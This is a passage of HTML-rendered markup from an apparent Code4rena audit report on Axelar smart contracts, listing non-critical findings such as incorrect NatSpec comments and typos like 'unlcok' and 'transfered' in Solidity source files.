class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derived</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">: */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:</span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">InterchainProposalExecutor</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IInterchainProposalExecutor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AxelarExecutable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>The contract is not abstract at all.</p>\n<h3 id=\"axelargatewaysol\" style=\"position:relative;\"><a href=\"#axelargatewaysol\" aria-label=\"axelargatewaysol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>AxelarGateway.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L40-L41\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L40-L41</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarGateway</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/// @dev Storage slot with the address of the current governance. `keccak256(&#39;mint-limiter&#39;) - 1`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">KEY_MINT_LIMITER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x627f0c11732837b3240a2de89c0b6343512886dd50978b99c76a68c6416a4d92</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Should say <code>address of the current mint limiter</code> not <code>governance</code>.</p>\n<h3 id=\"remoteaddressvalidatorsol\" style=\"position:relative;\"><a href=\"#remoteaddressvalidatorsol\" aria-label=\"remoteaddressvalidatorsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>RemoteAddressValidator.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L24-L27\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L24-L27</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L40-L41\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L40-L41</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">remote</span><span class=\"mtk1\">-</span><span class=\"mtk12\">address</span><span class=\"mtk1\">-</span><span class=\"mtk12\">validator</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RemoteAddressValidator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">dev</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Constructs</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RemoteAddressValidator</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">both</span><span class=\"mtk1\"> </span><span class=\"mtk12\">array</span><span class=\"mtk1\"> </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">must</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">equal</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_interchainTokenServiceAddress</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setup</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:        (</span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trustedChainNames</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trustedAddresses</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">string</span><span class=\"mtk1\">[], </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[]));</span></span></span></code></pre>\n<p><code>both array parameters must be equal in length</code> should be for the <code>_setup</code> call not the <code>constructor</code>.</p>\n<h2 id=\"n-06-typos-and-misspellings\" style=\"position:relative;\"><a href=\"#n-06-typos-and-misspellings\" aria-label=\"n 06 typos and misspellings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-06] Typos and misspellings</h2>\n<h3 id=\"interchaintokenservicesol\" style=\"position:relative;\"><a href=\"#interchaintokenservicesol\" aria-label=\"interchaintokenservicesol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainTokenService.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L380\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L380</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:     * </span><span class=\"mtk12\">can</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calculated</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ahead</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">time</span><span class=\"mtk1\">) </span><span class=\"mtk12\">then</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mint</span><span class=\"mtk1\">/</span><span class=\"mtk12\">burn</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">used</span><span class=\"mtk1\">. </span><span class=\"mtk12\">Otherwise</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lock</span><span class=\"mtk1\">/</span><span class=\"mtk12\">unlcok</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">used</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                                                                                 -&gt; </span><span class=\"mtk12\">unlock</span></span></span></code></pre>\n<p>Also appears at:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L406\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L406</a></p>\n<h3 id=\"interchaintokensol\" style=\"position:relative;\"><a href=\"#interchaintokensol\" aria-label=\"interchaintokensol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainToken.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token/InterchainToken.sol#L28\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token/InterchainToken.sol#L28</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token/InterchainToken.sol#L40\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token/InterchainToken.sol#L40</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token/InterchainToken.sol#L76\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token/InterchainToken.sol#L76</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">:     * </span><span class=\"mtk12\">TokenManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">specifically</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk15\">do</span><span class=\"mtk1\"> </span><span class=\"mtk12\">it</span><span class=\"mtk1\"> </span><span class=\"mtk12\">permissionlesly</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                          -&gt; </span><span class=\"mtk12\">permissionlessly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk12\">The</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transfered</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                               -&gt; </span><span class=\"mtk12\">transferred</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk12\">The</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transfered</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                               -&gt; </span><span class=\"mtk12\">transferred</span></span></span></code></pre>\n<h3 id=\"interchaintokenservicesol-1\" style=\"position:relative;\"><a href=\"#interchaintokenservicesol-1\" aria-label=\"interchaintokenservicesol 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainTokenService.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L159\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L159</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L496\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L496</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L500\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L500</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L559\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L559</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployement</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenManager</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                    -&gt; </span><span class=\"mtk12\">deployment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">where</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">coming</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">which</span><span class=\"mtk1\"> </span><span class=\"mtk12\">will</span><span class=\"mtk1\"> </span><span class=\"mtk12\">also</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">used</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reimburment</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gas</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                                                                                     -&gt; </span><span class=\"mtk12\">reimbursement</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">500</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">metadata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">passed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destiantion</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                                     -&gt; </span><span class=\"mtk12\">destination</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">559</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_sanitizeTokenManagerImplementation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">implementaions</span><span class=\"mtk1\">, </span><span class=\"mtk12\">TokenManagerType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                                                   -&gt; </span><span class=\"mtk11\">implementations</span></span></span></code></pre>\n<h3 id=\"tokenmanagersol\" style=\"position:relative;\"><a href=\"#tokenmanagersol\" aria-label=\"tokenmanagersol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>TokenManager.sol</code>:</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/token-manager/TokenManager.sol#L78\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/token-manager/TokenManager.sol#L78</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/token-manager/TokenManager.sol#L103\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/token-manager/TokenManager.sol#L103</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/token-manager/TokenManager.sol#L159\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/token-manager/TokenManager.sol#L159</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">78</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">notice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Calls</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">service</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initiate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cross</span><span class=\"mtk1\">-</span><span class=\"mtk12\">chain</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transfer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">after</span><span class=\"mtk1\"> </span><span class=\"mtk12\">taking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">appropriate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                                              -&gt; </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cross</span><span class=\"mtk1\">-</span><span class=\"mtk12\">chain</span><span class=\"mtk1\"> ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">:     * @</span><span class=\"mtk12\">notice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Calls</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">service</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initiate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cross</span><span class=\"mtk1\">-</span><span class=\"mtk12\">chain</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transfer</span><span class=\"mtk1\"> </span><span class=\"mtk15\">with</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> </span><span class=\"mtk12\">after</span><span class=\"mtk1\"> </span><span class=\"mtk12\">taking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span 